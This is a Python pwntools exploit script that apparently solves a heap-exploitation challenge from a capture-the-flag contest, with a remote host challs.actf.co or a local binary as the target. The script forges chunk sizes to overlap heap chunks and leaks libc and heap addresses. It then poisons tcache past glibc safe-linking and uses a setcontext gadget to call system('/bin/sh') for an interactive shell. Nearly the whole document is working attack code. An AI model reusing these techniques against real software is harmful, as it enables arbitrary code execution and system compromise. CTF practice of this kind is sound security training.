from pwn import *
import setcontext
import builtins

def sendlineafter(delim: bytes, val):
    p.recvuntil(delim)
    match type(val):
        case builtins.int | builtins.float:
            p.sendline(f"{val}".encode())
        case builtins.str:
            p.sendline(val.encode())
        case builtins.bytes:
            p.sendline(val)

def make(size: int, data: bytes, idx=True):
    sendlineafter(b": ", 1)
    sendlineafter(b": ", size)
    sendlineafter(b": ", data)
    if idx:
        p.recvuntil(b"allocated at index: ")
        return int(p.recvline(), 0)

def free(idx: int):
    sendlineafter(b": ", 2)
    sendlineafter(b": ", idx)

def view(idx: int):
    sendlineafter(b": ", 3)
    sendlineafter(b": ", idx)
    return p.recvline(keepends=False)

libc = ELF("./libc.so.6")
context.binary = file = ELF("./patched")
context.terminal = ["kitty"]
gdbscript = """
c
"""

if args.REMOTE:
    p = remote("challs.actf.co", "31501")
else:
    p = gdb.debug("./patched", gdbscript=gdbscript)

meh = b"ABCDEFGH"

make(0x1000, b"")

size = 0x500

a = make(0x18, b"")
b = make(size-8, b"")
c = make(0x100-8, p64(0) * 2 + p64(size+0x20) + p64(0x20))
d = make(0x18, b"")
e = make(size-8, b"")
f = make(0x100-8, p64(0) * 2 + p64(size+0x20) + p64(0x20))

free(e)
free(b)

free(a)
make(0x18, p64(0) * 3 + p64(size + 0x20 | 1)[:-1])
free(d)
make(0x18, p64(0) * 3 + p64(size + 0x20 | 1)[:-1])

make(size-8, b"")
make(size-8, b"")
make(0x600, b"")

leak = u64(view(c).ljust(8, b"\x00"))
libcbase = leak - 0x21acf0
libc.address = libcbase
log.info(f"{leak = :#x}")
log.info(f"{libcbase = :#x}")

leak = u64(view(f).ljust(8, b"\x00"))
heapbase = leak - 0x27d0
log.info(f"{leak = :#x}")
log.info(f"{heapbase = :#x}")

a = make(0x70-8, b"")
b = make(0x70-8, b"")
c = make(0x70-8, b"")

dest, stuff = setcontext.setcontext32(
    libc = libc,
    rip = libc.sym.system,
    rdi = next(libc.search(b"/bin/sh"))
)
log.info(f"{dest = :#x}")

free(c)
free(b)
free(a)
payload = b"A" * 0x70
mangle = (heapbase + 0x3000) >> 12
payload += p64(dest ^ mangle)
make(0x70-8, payload)
assert b"\n" not in payload
make(0x70-8, b"")
make(0x70-8, stuff, idx=False)

p.interactive()